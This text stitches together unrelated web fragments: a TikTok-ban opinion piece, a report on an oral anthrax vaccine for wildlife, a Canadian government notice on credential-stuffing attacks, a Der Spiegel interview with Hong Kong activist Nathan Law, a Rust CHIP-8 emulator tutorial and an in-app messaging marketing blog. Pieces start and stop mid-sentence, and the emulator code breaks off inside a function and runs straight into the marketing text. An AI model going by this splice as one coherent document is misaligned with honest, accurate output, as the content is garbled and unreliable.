<p>There is a common lack of critical thinking about Tiktok but a prevalence of imagination for reasons Trump has for its ban. One of the frequent explanations is the Tulsa Rally. From a recent Forbes article: “What if this has nothing to do with China, nothing to do with national security? What if this does have everything to do with Trump’s rally in Tulsa, Oklahoma, in June?”</p>
<p>Such an argument actually is connected to national security. Such an outcome could have just as easily happened to Biden (or to Clinton had she been elected). I read much of the argument against Tiktok’s ban as being more about supporting the opposite of whatever Trump says rather than critical thinking about outcomes.</p>
<p>Quotes like this one <a href="https://www.wired.com/story/trump-tiktok-ban-hypocrisy/">from Wired</a> also make me question the supporting examples: “For the past several years, I’ve warned that the biggest threat to the internet is the technological cold war between the reasonably open, free internet of the West, and the closed authoritarian internet of the East. Now, with the President’s repudiation of free speech and open markets, I worry whether there isn’t as much difference between the two sides after all.” For the long lists of companies above and the large volume of domestic speech critical of Trump when there is no such comparison for Xi — I take this to be, well, hypocrisy on the part of the writer making this claim.</p>
<p>Even the <a href="https://twitter.com/ACLU/status/1289412933991174144?s=20">ACLU seemed to be</a> both against and for a Tiktok ban in recent tweets: “Banning an app like TikTok, which millions of Americans use to communicate with each other, is a danger to free expression and technologically impractical.” But the prevented free expression on Tiktok, noted above, is a great danger too. And since when does the ACLU care about …</p></div></div></article></div>

This is especially common in the western Texas Hill Country, where each year the disease kills livestock and wildlife.</p><p>While normally not an attention-grabbing problem, a spike of cases in 2019 made headlines around the state.</p><p>According to Dr. Jamie Benn Felix, a postdoctoral research associate in the Cook Wildlife Lab led by CVMBS Department of Veterinary Pathobiology’s (VTPB) Dr. Walt Cook, that spike may have been responsible for the deaths of more than 10,000 animals.</p><p>“If you assume the economic value for each animal was $1,000, which is probably extremely low given the number of exotic species on some of the ranches, you’re looking at an economic loss of $10 million in just a few months,” she said. “And given the problems with reporting cases, it could be significantly higher than that.”</p><p>The good news is that there is already a vaccine for anthrax, which many livestock owners administer annually. Unfortunately, it can only be administered with an injection that is time consuming for livestock and not feasible for wildlife.</p><p>With that in mind, Benn Felix and the Cook Wildlife Lab team, in collaboration with VTPB researchers Dr. Allison Rice-Ficht and Dr. Thomas Ficht, went to work to attempt to create a formulation to deliver the vaccine orally, which would allow for potential distribution to wildlife. She recently published the results of a pilot study in <i><a href="https://t.umblr.com/redirect?z=https%3A%2F%2Fwww.nature.com%2Farticles%2Fs41541-020-0208-3&amp;t=NmM2Yzg2MGM5OGJjNGJkZDVhMjFiNGE5YmY4MzA3ZWRhOTExN2MxMSxKREJ6b0RTVg%3D%3D&amp;b=t%3AeWj9QNbkB8x7_Y2XTyPu8A&amp;p=https%3A%2F%2Fnuadox.com%2Fpost%2F626558338474393600%2Foral-anthrax-vaccine-for-livestock-wildlife&amp;m=0&amp;ts=1597738941">Nature</a></i> and is now moving on to the next round of tests.</p><p>If successful, they will have developed the first effective oral vaccine against anthrax for wildlife.</p><p>“The preliminary results showed that this concept has potential, so now we are starting up a deer study and we’ll see where it goes from there,” Benn Felix said.</p><p>Anthrax is among the oldest enemies of microbiologists, and the current vaccination method – using what’s known as the Sterne strain – is basically the same as it was 85 years ago when Max Sterne developed it, so an oral vaccine has been a goal for some time.</p><p>In fact, in the past, many livestock owners trying to save time and effort would pour the vaccine over food, but previous testing by Benn Felix proved the ineffectiveness of this method.</p><p>The main issue with an oral vaccine is the ability to keep the bacteria alive in the gastrointestinal tract long enough and in the right amount to produce the desired immune activity in the animal. To that end, other efforts have been made with different strains of the bacteria and other mediums, but have thus far not proven effective.</p><p>Benn Felix’s approach is both simpler and more complex – simpler, because her approach uses the same strain that has been proven effective for decades, but more complex because of the use of a gel-like suspension.</p><p>“Our idea is that with this oral anthrax vaccine, we can get it into a bait of some sort and then easily vaccinate these animals,” Benn Felix said. “The formulation that we’re using is the same live strain of bacteria from the current commercial vaccine put into a gel-like substance.”</p><p>Benn Felix compared the release of the vaccine in the gel-like substance, technically known as alginate encapsulation, to a common gumball machine.</p><p>“It’s the same general idea as those big glass gumball machines you would see in the mall or a store, in which you put a quarter and get a single gumball out,” she said. “The gel holds a bunch of the live attenuated bacteria and it gradually releases some of that bacteria over time.”</p><p>Though they’re currently still working at a small scale, Benn Felix and her team are keeping an eye to the distant future and considering how this vaccine might be implemented at a larger scale.</p><p>One example they’re looking at is what Dr. Tonie Rocke did at the National Wildlife Health Center in Madison, Wisconsin, with a plague vaccine for prairie dogs.</p><p>“They put their vaccine into a bait that was flavored with peanut butter flavoring,” Benn Felix said. “That is the same general idea that we’re going for with this; we would just distribute the baits and then see how many were consumed, or we would have trail cameras that would see if there was any non-target species that ate any of it.</p><p>"There are a lot of things that would go into formulating the bait – making sure the vaccine is still stable and viable when it’s in the bait and then seeing how it would affect or be consumed by wildlife or any other wildlife we don’t want to have it,” she said.</p><p>Currently, one of Benn Felix’s biggest obstacles is a lack of data on exactly how much damage is caused by anthrax in wildlife in Texas.

<p>August 15, 2020 – Ottawa, Ontario – Treasury Board of Canada Secretariat</p> 
<p>The Government of Canada, like every other government and private sector organization in the world, deals with ongoing and persistent cyber risks and threats. That is why the government has robust systems and tools in place to monitor, detect and investigate potential threats, and neutralize them as quickly as possible.</p> 
<p>The Government of Canada is taking action in response to “credential stuffing” attacks mounted on the GCKey service and CRA accounts. These attacks, which used passwords and usernames collected from previous hacks of accounts worldwide, took advantage of the fact that many people reuse passwords and usernames across multiple accounts.</p> 
<p>Used by approximately 30 federal departments, GCKey allows Canadians to access services like Employment and Social Development Canada’s My Service Canada Account or their Immigration, Refugees and Citizenship Canada account. Of the roughly 12 million active GCKey accounts in Canada, the passwords and usernames of 9,041 users were acquired fraudulently and used to try and access government services, a third of which accessed such services and are being further examined for suspicious activity.&nbsp;</p> 
<p>Affected GC Key accounts were cancelled as soon as the threat was discovered and departments are contacting users whose credentials were revoked to provide instructions on how to receive a new GCKey. More information is available on Canada.ca. If you have immediate concerns, please call 1-800-O-Canada.</p> 
<p>Approximately 5,500 CRA accounts were targeted as part of the GCKey attack and another recent “credential stuffing” attack aimed at the CRA. Access to all affected accounts has been disabled to maintain the safety and security of taxpayers’ information and the Agency is contacting all affected individuals and will work with them to restore access to their CRA MyAccount.</p> 
<p>The government is continuing its investigation, as is the RCMP to determine if there have been any privacy breaches and if information was obtained from these accounts. As well, the Office of the Privacy Commissioner has been contacted and alerted to possible breaches.</p> 
<p>To help reduce the risk of cyberattacks, always use a unique password for all online accounts. Do not reuse the same password for different systems and applications and regularly monitor all online accounts for suspicious activity.</p> 
<p>The safety and security of Canadians, and their information, is the Government of Canada’s top priority. We continue to actively investigate these attacks and are taking swift action to implement additional security features as the investigation continues.</p>

<p><em>Nathan Law, 27, has spent the past seven years fighting China’s gradual takeover of Hong Kong. In 2017, he and other activists were sentenced to prison after thousands of Hong Kong citizens joined together to form the umbrella movement and called for free elections. In 2016, Law’s election to the Hong Kong parliament was declared invalid on dubious grounds. He fled to London this year after Beijing enacted a new national security law for Hong Kong on June 30. The law is directed against activities deemed to be subversive, separatist or terrorist from a Chinese perspective, and security forces have gained unprecedented power as a result.</em></p>


<div>
<p><strong>DER SPIEGEL:</strong> Mr. Law, you left Hong Kong at about the same time the new Chinese national security law was imposed. Was that a personal or a political decision?</p><p><strong>Law:</strong> It was a bit of both. Of course, every one of us with a high-profile position in international advocacy work is very vulnerable under the national security law.</p><p><strong>DER SPIEGEL:</strong> Who are you referring to when you say "us”?</p><p><strong>Law:</strong> Joshua Wong, for example, and Jimmy Lai, Martin Lee, and others. It has become very difficult for us to continue our work and, for example, demand a strategy of less appeasement to China. So, I talked with Joshua and we agreed that I am suitable for bearing the role of being an advocate of Hong Kong outside Hong Kong. Here, I can speak freely.</p>
</div>

<div>
<p><strong>DER SPIEGEL:</strong> How has the situation in Hong Kong developed since the security law came into effect?</p><p><strong>Law:</strong> There is a politics of fear and terror dispersing. Nobody knows exactly what is going to happen because the law deliberately leaves so much room for interpretation. And I don’t think that the security bureau has actually established themselves to operate fully at this stage -- we are only in the very first weeks. But they have already arrested individuals who were merely in possession of stickers or flags with the words "Free Hong Kong, revolution of our time.”</p><p><strong>DER SPIEGEL:</strong> The slogan of the democracy movement.</p>
</div>

<p><strong>Law:</strong> Some of my friends are deleting their Facebook posts. They are concerned, especially for their families. Many people are testing the waters, really guessing where the line is. So, the law is encouraging political fear and people self-censoring and the erosion of our freedom of expression and assembly.</p>

<p><strong>DER SPIEGEL: </strong>What are your thoughts on the Hong Kong government delaying the election that had been planned for September for one year?</p><p><strong>Law: </strong>The reason the government delayed the election is that the government is afraid of losing and is trying to buy time to reverse its very low popularity. I don’t think it will work -- people will still be very angry with them as long as they are still deploying heavy-handed approaches&nbsp;in Hong Kong. It shows that the law and procedures in Hong Kong serve Beijing's political agenda. Hong Kong’s government is not accountable&nbsp;to the people and it's a puppet that is ordered to destroy&nbsp;the freedom of Hong Kong’s people.</p>
</div>

<div>
<p><strong>DER SPIEGEL:</strong> Is the security law the nail in the coffin for the movement?</p><p><strong>Law:</strong> I don’t think so. Actually, it will transform the movement in a more subtle form that circumvents the restriction. And you can see that there are a lot of people voicing their opposition despite COVID-19. The atmosphere in Hong Kong has changed. We’re in a period of quietness now, but it’s just a calm surface before the storm.</p><p><strong>DER SPIEGEL:</strong> Are you concerned about your family?</p>

<p><strong>Law:</strong> Of course. If you look at the implementation of the national security law in mainland China, then it not only targets you -- but also your family, your friends, your colleagues.</p><p><strong>DER SPIEGEL:</strong> You recently wrote in a newspaper column that your mother witnessed the Cultural Revolution and is about to witness another one. Isn’t that exaggerated? As many as 1.8 million people died during the Cultural Revolution.</p><p><strong>Law:</strong> Well, I don’t want to claim that we are the most tragic people in history. But it is a cultural revolution because of the foreseeable transformation of society. We can already see the beginning of it. For example, in the national security law, there is a clause that, if you turn in someone else, you could have a reduction in your own sentence. That encourages a reporting culture. And that’s the thing that cultural revolutions emphasize -- people monitoring people. With no trust in society, the social bonds between people are getting destroyed and infiltrated with totalitarianism and the narrative of power.</p><p><strong>DER SPIEGEL:</strong> What does your worst-case scenario look like?</p><p><strong>Law:</strong> That none of us can run for election on a pro-democracy platform anymore. That the secret police arrest you in the early morning, and none of your friends know where you are. That you are being locked in a remote detention camp, being tortured, just like what happened to Chinese dissidents. That is the worst we can get. I see it as my responsibility to turn the fight against that into an international front.</p><p><strong>DER SPIEGEL:</strong> As a kind of foreign minister of your movement?</p><p><strong>Law:</strong> I wouldn’t put it that way. I am just trying to be a voice.</p><p><strong>DER SPIEGEL:</strong> How did you spend your last day in Hong Kong?</p><p><strong>Law:</strong> Like all the other days before. I met with my team and pretended to campaign in order to avoid worries. I needed to keep it secret because, if I were to be indicted and people helped me or they recognized my leaving, but didn’t turn me in, they would also have been in danger. I didn’t do anything special.</p><p><strong>DER SPIEGEL:</strong> That can’t have been easy. You knew that you probably wouldn’t be able to return to Hong Kong for years.</p><p><strong>Law:</strong> It was difficult. But sometimes, all you can do is hold back your emotions and try to be as calm as possible to protect others.</p><p><strong>DER SPIEGEL:</strong> Did you have any troubles leaving the city?</p><p><strong>Law:</strong> I thought I might have been blacklisted by the authorities, but it turned out I wasn’t. So, I left quite smoothly.</p><p><strong>DER SPIEGEL:</strong> Why did you choose London?</p><p><strong>Law:</strong> London is a very special place. I’ve been here a couple of times before. The United Kingdom has an historical relationship with Hong Kong, and they play a major role in dealing with the issue. And I think London as a media hub is good place to tell people that there is not only a warfare going on between China and the United States. Europe needs to become a more united values-bound front against the authoritarianism in China.</p>

<p><strong>DER SPIEGEL:</strong> Do you feel safe in London?</p><p><strong>Law:</strong> We all know that danger is everywhere because China’s reach could be really extensive. I’ve just read news about a New Zealand car crash that killed two Chinese dissidents, and the authorities found it very suspicious. So, you have to be extremely cautious about the surroundings and move frequently, trying not to expose yourself too much.</p><p><strong>DER SPIEGEL:</strong> Is that why we are meeting here in Regent’s Park.</p><p><strong>Law:</strong> That’s one reason. The other is, it’s beautiful here. I love how green London is.</p><p><strong>DER SPIEGEL:</strong> But even here, you are in some ways surrounded by China everywhere. When you land at Heathrow Airport, take a black cab into the city, eat at Pizza Express or watch a Premier League game with the Wolverhampton Warriors, Chinese money is involved everywhere.</p><p><strong>Law:</strong> Yes, I think the West has long underestimated what’s happening with that kind of investment. There is no such thing as independent companies in China. They all have to listen to the orders of the Communist Party. That’s why the global community needs to act as a coherent front whenever they do business with China: to enforce human rights, to hold them accountable.</p><p><strong>DER SPIEGEL:</strong> How would you judge the British government’s recent approach toward Beijing?</p><p><strong>Law:</strong> They are moving in the right direction. And fast. At the beginning of this year, the U.K. government said it will continue using Huawei for its 5G network, but it changed course completely in several months after the pandemic and after the Hong Kong protests. But in order to address the internal human rights violations in mainland China and the brutality in Hong Kong as well as in Xinjiang, there are a lot more things the UK and others could do.</p><p><strong>DER SPIEGEL:</strong> Such as?</p><p><strong>Law:</strong> For example, boycotting the Winter Olympics in 2022. That would really be a strong signal. As would be recognizing Taiwan and addressing the human rights violations in Xinjiang. You could impose laws stating that companies that use Xinjiang labor should not be allowed in your country. We’ve got a lot of tools, and Germany as China’s biggest trading partner could play a crucial role in this debate.</p><p><strong>DER SPIEGEL:</strong> But the Germans are clearly trying not to get into any trouble with Beijing.</p><p><strong>Law:</strong> It wouldn't be appropriate for us to say we are disappointed by Germany. But we know the history of Germany as a champion of liberal values after the Wall came down, its understanding of the problem of totalitarianism and authoritarianism. We are talking about a country that has supposedly embraced democratic values more than the others, but they are still prioritizing trade far more than human rights. The least the German government could do is suspend the extradition deal with Hong Kong as the UK has done. When it comes to preserving democratic values, Germany is a very symbolic place. Chancellor Merkel should know that.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><p>So, why write an emulator? For me, the spark were nostalgia and curiosity. Then excitement and the familiar headache of “why does this not work”, followed by pride and a sense of accomplishment when I saw graphics on the screen. 🎉🎉🎉</p><p>Yes, writing emulators can be insanely fun. You <em>will</em> experience these feelings while doing it (or anything challenging for that matter). 😎</p><blockquote><p>Skip this part if you just want to learn to make emulators. Stay for a dose of 2000s nostalgia and awesomeness.</p></blockquote><p>In early 2000s I was a kid obsessed with video games. My family’s bought our first computer around November 2001. It was a beastly machine with Pentium 4 1.7Ghz, 256MB of RAM and GeForce 2 MX. My access to it was limited though as I was told <em>“computers are evil”</em> and <em>“go play outside”</em>. 😂😂😭</p><p>Fortunately, I was one of those kids who translate <em>“not allowed”</em> to <em>“I must obsessively do this”</em> and slowly wriggled my share of play time. My parents quickly discovered I had a talent for breaking things and the computer landed in the repair shop or had it’s data wiped (or both) several times a year. 😈😛</p><blockquote><p>The fastest way to learn how to install Windows XP at 6yo is to delete system32 2h before your father comes back from work. 😱</p></blockquote><p>Along this mess I started hanging out with a kid who owned a GameBoy and routinely visited an after-school club with a PlayStation 2. We’d queue up to compete in Tony Hawk’s American Wasteland and FIFA.</p><blockquote><p>THAW is one of the best skating games of all time btw. 🎮🛹</p></blockquote><p>Around 2007 I got my hands on a PSP and promptly modded it to allow running games from the memory card. I discovered that apart from games, I could put <em>other</em> things on it. Yes, you guessed it: emulators. Imagine being a young kid realizing you could play GBA games on your PSP. EPIC! Santa’s in town! <sup id="fnref:1"><a href="#fn:1" role="doc-noteref">1</a></sup> 🎅🎅🎅</p><p><img src="https://wjdevschool.com/images/blog/psp.png" alt="PSP 2000"></p><p>Around 2010 my interest in computers accelerated and I started learning programming in C++. I didn’t even think about making an emulator on my own. That was reserved for Grand Wizards and John Carmack. I could maybe scrape together a Pong clone with
<a href="https://www.libsdl.org/download-1.2.php" target="_blank">SDL 1.2</a>.</p><blockquote><p>Back then I got involved in a community around development of an indie game Ether Fields, which helped fuel my passion for programming.</p><p>RIP Ether Fields, you shall be remembered. 😥</p></blockquote><p>I didn’t have a breakthrough with EmuDev until much later. I stumbled on a live stream that was the first episode of the
<a href="https://www.youtube.com/watch?v=Fsi9HPcyrU8&amp;list=PL-sXmdrqqYYcL2Pvx9j7dwmdLqY7Mx8VY" target="_blank">Ferris Makes Emulators</a> series. I got immediately interested and watched each episode as they came out. The guy was <em>making an emulator</em> <em><strong>live</strong></em>! And it looked <em>easy</em>! It looked like I could do it.</p><p>Having the motivation and knowing it was possible, I mustered myself up and wrote my first GameBoy emulator. 🤠🤠🤠</p><p>So, let’s talk about doing that!</p><p>We’ll learn how consoles work and how to emulate them. This part is going to be half technical and half process-oriented.</p><p>Our goal is to learn how to make an emulator on our own. Because of that I didn’t want to write a step-by-step guide to making a specific one. Rather, we’ll focus on the process.</p><blockquote><p>As the saying goes, give a man a fire and he’s warm for a day; set a man on fire and he’s warm for the rest of his life.</p><p>Oh, wait… Anyway, you get the point! 🍺😁</p></blockquote><p>Let’s pick a console to emulate. We’ll use it as a base for the rest of the article.</p><p>The popular choices for beginner-level emulators are:</p><ol><li>CHIP-8</li><li>GameBoy Classic</li><li>NES</li></ol><p>We’re going to go with CHIP-8 because it’s by far the simplest and we can use it to study the basics.</p><blockquote><p>I super-über-duber strongly encourage you to write a GameBoy Classic or NES emulator on your own. It’s awesome fun and amazing satisfaction when you’re finished and see it run real games. 👾👾👾</p></blockquote><p>Before we write any code we’ll want to research the console we’re trying to emulate.</p><p>We need to know things like:</p><ul><li>How complex is it?</li><li>Can we get sufficient documentation for it?</li><li>Can we (legally) get games for it?</li></ul><p>I recommend searching for technical reference docs and skimming through them. Beginner threads on EmuDev communities are also good places to start.</p><blockquote><p>Here are two EmuDev community gathering places:</p><ul><li><a href="https://www.reddit.com/r/EmuDev/" target="_blank">EmuDev Reddit</a></li><li><a href="https://discord.gg/ynMwqQ" target="_blank">EmuDev Discord</a></li></ul></blockquote><p>Let me show you the things we’ll use for CHIP-8:</p><ul><li><a href="http://devernay.free.fr/hacks/chip8/C8TECH10.HTM" target="_blank">Cowgod’s CHIP-8 Technical Reference</a></li><li><a href="http://mattmik.com/files/chip8/mastering/chip8.html" target="_blank">Mastering CHIP-8</a></li><li><a href="https://github.com/tomdaley92/kiwi-8" target="_blank">Kiwi-8 Emulator</a></li><li><a href="https://www.zophar.net/pdroms/chip8.html" target="_blank">Public Domain ROMs</a></li></ul><p>We have two reference docs describing CHIP-8’s inner workings, another emulator and a collection of public domain ROMs. Cool! 😎</p><p>Expect to have to search for things during development. I started with just the Cowgod’s doc and collected the rest along the way.</p><blockquote><p>Multiple reference docs will help when we encounter errors and/or ambiguities. And we <em>will</em> encounter them.</p></blockquote><p>Okay, we’re ready to start writing.</p><p>Well, almost. We still need to pick a language. 😁</p><p>You might think we should pick a “fast” language like C or Rust. A lot of people begin this way but for old 2D consoles it doesn’t really matter. If Python is your thing, run with it.</p><p>Here’re some of the cooler (crazier?) things people did:</p><ul><li><a href="https://github.com/Baekalfen/PyBoy" target="_blank">GB Emulator in Python</a></li><li><a href="https://github.com/gabrielrcouto/php-terminal-gameboy-emulator" target="_blank">GB Emulator in PHP and Terminal</a></li></ul><p>The latter one made me think of this:</p><p><img src="https://wjdevschool.com/images/blog/emulator-in-php.png" alt="Emulator in PHP"></p><p>It’s funny. 😅😎</p><blockquote><p>We’ll be doing a lot of binary operations so it’s good to be comfy with them before starting.</p></blockquote><p>Because we have to pick something, we’ll use Rust v1.45.</p><p>Let’s start writing!</p><p>The first thing we’ll do is get a game ROM into memory. We don’t care what ROM it is as long as it’s a working one. We’ll be using it later to implement the CPU instruction-by-instruction.</p><blockquote><p>If you’re young enough to be confused what a ROM is. Console games used to be distributed on ROM cartridges. ROM for read-only memory. 💾</p></blockquote><p>According to the docs, CHIP-8 has 4096 bytes (4KB) of internal memory and ROMs are loaded at address 0x200. We can model this with a simple array. We’ll also create a struct to hold other components of our emulator we’ll add later.</p><p>Here’s how that looks like:</p><div><pre><code data-lang="rust"><span>const</span> MEMORY_SIZE: <span>usize</span> <span>=</span> <span>4096</span>;

<span>pub</span> <span>struct</span> <span>CHIP8</span> {
    mem: [<span>u8</span>; MEMORY_SIZE],
}

<span>impl</span> CHIP8 {
    <span>pub</span> <span>fn</span> <span>new</span>() -&gt; <span>Self</span> {
        Self {
            mem: [<span>0</span>; MEMORY_SIZE]
        }
    }

    <span>pub</span> <span>fn</span> <span>load_rom</span>(<span>&amp;</span><span>mut</span> self, path: <span>&amp;</span><span>str</span>) -&gt; <span>io</span>::Result<span>&lt;</span>()<span>&gt;</span> {
        <span>let</span> <span>mut</span> rom_file <span>=</span> File::open(path)<span>?</span>;
        <span>let</span> <span>mut</span> rom_data <span>=</span> Vec::new();

        <span>let</span> rom_size <span>=</span> rom_file.read_to_end(<span>&amp;</span><span>mut</span> rom_data)<span>?</span>;

        <span>// Load the ROM into main memory at 0x200
</span><span></span>        <span>for</span> i <span>in</span> <span>0</span>..rom_size {
            self.mem[<span>0x200</span> <span>+</span> i] <span>=</span> rom_data[i];
        }

        Ok(())
    }
}
</code></pre></div><blockquote><p>We could load directly to the <code>mem</code> array to be efficient but this complicates the code so I chose against it.</p></blockquote><p>Cool! Now let’s look at the CPU.</p><p>The CPU is the primary thing that makes consoles work.</p><p>There are two things we need to emulate with regard to the CPU regardless of console or architecture:</p><ul><li>CPU registers</li><li>CPU instructions</li></ul><p>Let’s talk about them in order.</p><blockquote><p>Registers and instructions are defined by the CPU architecture known as
<a href="https://en.wikipedia.org/wiki/Instruction_set_architecture" target="_blank">ISA</a> (Instruction Set Architecture). For example, PCs use the
<a href="https://en.wikipedia.org/wiki/X86-64" target="_blank">x86_64</a> ISA. GBA uses
<a href="https://en.wikipedia.org/wiki/ARM_architecture" target="_blank">ARM</a>. N64, PS1, PS2 and PSP all use
<a href="https://en.wikipedia.org/wiki/MIPS_architecture" target="_blank">MIPS</a>.</p></blockquote><p>The registers are tiny pieces of fast memory internal to the CPU.</p><p>On CHIP-8 these are:</p><table><thead><tr><th>Register</th><th>Size</th><th>Count</th><th>Description</th></tr></thead><tbody><tr><td>V</td><td>8 bits</td><td>16 (from V0 to VF)</td><td>General purpose</td></tr><tr><td>I</td><td>16 bits</td><td>1</td><td>General purpose</td></tr><tr><td>PC</td><td>16 bits</td><td>1</td><td>Program counter</td></tr><tr><td>SP</td><td>8 bits</td><td>1</td><td>Stack pointer</td></tr><tr><td>DT</td><td>8 bits</td><td>1</td><td>Delay timer</td></tr><tr><td>ST</td><td>8 bits</td><td>1</td><td>Sound timer</td></tr></tbody></table><p>We can model them like this:</p><div><pre><code data-lang="rust"><span>pub</span> <span>struct</span> <span>CPU</span> {
    v: [<span>u8</span>; <span>16</span>], <span>// the V registers
</span><span></span>    i: <span>u16</span>,      <span>// the I register
</span><span></span>    pc: <span>u16</span>,     <span>// the program counter
</span><span></span>    sp: <span>u8</span>,      <span>// the stack pointer
</span><span></span>    dt: <span>u8</span>,      <span>// delay timer
</span><span></span>    st: <span>u8</span>,      <span>// sound timer
</span><span></span>}
</code></pre></div><p>Pretty simple, no?</p><p>As you may have already guessed, instructions are the operations the CPU can perform and the most important thing we need to implement.</p><p>As programmers we often think of behaviour and data as separate. It may surprise you to learn that this division is artificial.</p><p>At the level of the CPU, behaviour IS data. 🐱‍💻</p><p>CPU instructions are encoded and fed to the CPU as regular bytes from memory. Each instruction has a specific bit pattern that allows the CPU to understand it.</p><blockquote><p>Instructions are also called <em>operations</em> and their byte representations are called <em>operation codes</em> or <em>opcodes</em> for short.</p></blockquote><p>CHIP-8 instructions are always 2 bytes long and arranged in
<a href="https://en.wikipedia.org/wiki/Endianness" target="_blank">big endian</a> order, that is with the most significant byte first.</p><p>For example, here are three instructions from the CHIP-8 instruction set:</p><table><thead><tr><th>Opcode</th><th>Name</th><th>Pseudocode</th><th>Description</th></tr></thead><tbody><tr><td>6xkk</td><td>LD</td><td><code>v[x] = kk</code></td><td>Set Vx to kk.</td></tr><tr><td>7xkk</td><td>ADD</td><td><code>v[x] = v[x] + kk</code></td><td>Add kk to Vx.</td></tr><tr><td>8xy0</td><td>LDR</td><td><code>v[x] = v[y]</code></td><td>Set Vx to Vy.</td></tr></tbody></table><p>Where opcode is a hexadecimal number including special symbols:</p><ul><li><code>x</code> 4-bit index of the V register (V0-VF)</li><li><code>y</code> 4-bit index of the V register (V0-VF)</li><li><code>kk</code> 8-bit constant</li></ul><p>Let’s look at a sample program to make sure we understand how these work:</p><p>If ran this program on the CHIP-8 CPU, the following would happen:</p><ol><li><code>60 00</code> Set the value of register V0 to 0.</li><li><code>61 02</code> Set the value of register V1 to 2.</li><li><code>70 11</code> Set the value of register V0 to the sum of itself and 11 (0 + 11 = 11).</li><li><code>83 00</code> Set the value of register V3 to the value of register V0.</li></ol><p>Great! We now understand how CPU instructions work! 🥳🥳🥳</p><p>But, how does the CPU know which instruction to execute next? 🦝</p><p>Remember the special PC register? It’s called the <em>program counter</em> and used to store the address of the next instruction to execute.</p><blockquote><p>Our CHIP-8 emulator will start with the PC set to the beginning of the loaded ROM (0x200) and increment it by 2 every instruction. 💻</p></blockquote><p>Here are some of the things manipulating the PC achieves:</p><ul><li>Conditionally skipping instructions (if-statements)</li><li>Jumping to a different instruction (loops and gotos)</li><li>Calling procedures / functions</li></ul><blockquote><p>Calling procedures is done by pushing the PC onto the stack and popping it back when the procedure returns.</p></blockquote><p>If you ever pondered how these work at the CPU level, now you know. 😜</p><p>We’ve talked about all the components that make up the CPU so it’s time to implement it.</p><p>Let’s look at how we might do it:</p><div><pre><code data-lang="rust"><span>impl</span> CPU {
    <span>pub</span> <span>fn</span> <span>new</span>() -&gt; <span>Self</span> {
        Self {
            v: [<span>0</span>; <span>16</span>],
            i: <span>0</span>,
            <span>// Set program counter to the beginning of the ROM
</span><span></span>            pc: <span>0x200</span>,
            sp: <span>0</span>,
            dt: <span>0</span>,
            st: <span>0</span>,
        }
    }

Product A is letting you use it without engaging with you <strong>like it swore silence.</strong></p><p>Product B is popping up messages when you are in the product to <strong>let you know there is a new feature or give a tip that will make you a more efficient user.</strong></p><p><em>I would choose Product B over Product A any day because I know there is a business behind it that cares about the users.</em></p><p><strong>In-app messaging</strong> is a proven way to improve <a href="https://userguiding.com/blog/increase-user-engagement/">customer engagement</a> and satisfaction with a product, and also <a href="https://userguiding.com/blog/increase-retention/">increase customer retention</a>.</p><p><strong>But only when it is done right. </strong></p><p>Done well, it helps show users how to get the most out of the product that they are using and drives sales to relevant upgrades and features. Done badly, it is a nuisance that <strong>breaks users’ workflows and drives customers away.</strong></p><p><em>With UserGuiding, you can create in-app messages and product tours in minutes, <strong>without coding</strong>. <a href="http://panel.userguiding.com/register">Start your </a><a href="https://panel.userguiding.com/register">free</a><a href="http://panel.userguiding.com/register"> trial.</a></em></p><p>In this article, I tried to explain what a good in-app message is, collected and examined the best examples I have seen to help you start using in-app messages<strong> like a champ.</strong></p><p>You can <a href="#examples">jump straight to the examples by clicking here.</a></p><h2 id="ftoc-heading-1">What is In-App Messaging</h2><p>In-app or in-product messaging is the term for the notifications that users receive while they are using an application or product:</p><p>This can be <strong>slip-outs, pop-ups, modals</strong>, really a<strong>nything that catches the user’s attention</strong> to provide them with information or call them to action.</p><p>In-app messaging should be clearly distinguished from<strong> push notifications</strong>, which pop-up when the app is closed and appear as an external notification on a user’s device.</p><p>The type of messaging that can be delivered in-app can really be anything but is generally <strong>up-sales, notifications about new features, guidance, and requests for feedback</strong>.</p><p>In-app messaging works well because you have a captive audience. Also, anyone who uses the product can receive messages without having to provide separate permissions. This is in contrast to push notifications, which must be opted into or out of separately.</p><p><em>About 30% of people opt out of push notification, <strong>which I could relate.</strong></em></p><p>In-app messages can also be worked into the user’s workflow. Users can be shown <strong>relevant information</strong> while they are using the product, and therefore when the information is most useful to them.</p><p>They can also be given different information at different stages of their workflow to ensure that they always receive the <strong>most important and effective messaging.</strong></p><p>According to<a href="http://info.localytics.com/blog/6-stats-that-prove-how-important-push-notifications-in-app-messaging-are-to-your-apps-success" target="_blank" rel="nofollow noreferrer noopener"> Localytics</a>, in-app messaging, <strong>when done well</strong>, can lead to user retention rates <strong>3.5 times higher</strong> than for products not using this feature. It can also improve conversion rates fourfold.</p><figure><img src="https://userguiding.com/blog/wp-content/uploads/2020/08/what-is-in-app-message-1160x373.jpg" alt="what is in app message" loading="lazy" data-src="https://userguiding.com/blog/wp-content/uploads/2020/08/what-is-in-app-message-1160x373.jpg" data-srcset="https://userguiding.com/blog/wp-content/uploads/2020/08/what-is-in-app-message-1160x373.jpg 1160w, https://userguiding.com/blog/wp-content/uploads/2020/08/what-is-in-app-message-800x257.jpg 800w, https://userguiding.com/blog/wp-content/uploads/2020/08/what-is-in-app-message-1536x494.jpg 1536w, https://userguiding.com/blog/wp-content/uploads/2020/08/what-is-in-app-message-2048x659.jpg 2048w, https://userguiding.com/blog/wp-content/uploads/2020/08/what-is-in-app-message-120x39.jpg 120w, https://userguiding.com/blog/wp-content/uploads/2020/08/what-is-in-app-message-90x29.jpg 90w, https://userguiding.com/blog/wp-content/uploads/2020/08/what-is-in-app-message-320x103.jpg 320w, https://userguiding.com/blog/wp-content/uploads/2020/08/what-is-in-app-message-560x180.jpg 560w, https://userguiding.com/blog/wp-content/uploads/2020/08/what-is-in-app-message-1920x617.jpg 1920w, https://userguiding.com/blog/wp-content/uploads/2020/08/what-is-in-app-message-scaled.jpg 2560w" data-sizes="(max-width: 1160px) 100vw, 1160px" srcset="https://userguiding.com/blog/wp-content/uploads/2020/08/what-is-in-app-message-1160x373.jpg 1160w, https://userguiding.com/blog/wp-content/uploads/2020/08/what-is-in-app-message-800x257.jpg 800w, https://userguiding.com/blog/wp-content/uploads/2020/08/what-is-in-app-message-1536x494.jpg 1536w, https://userguiding.com/blog/wp-content/uploads/2020/08/what-is-in-app-message-2048x659.jpg 2048w, https://userguiding.com/blog/wp-content/uploads/2020/08/what-is-in-app-message-120x39.jpg 120w, https://userguiding.com/blog/wp-content/uploads/2020/08/what-is-in-app-message-90x29.jpg 90w, 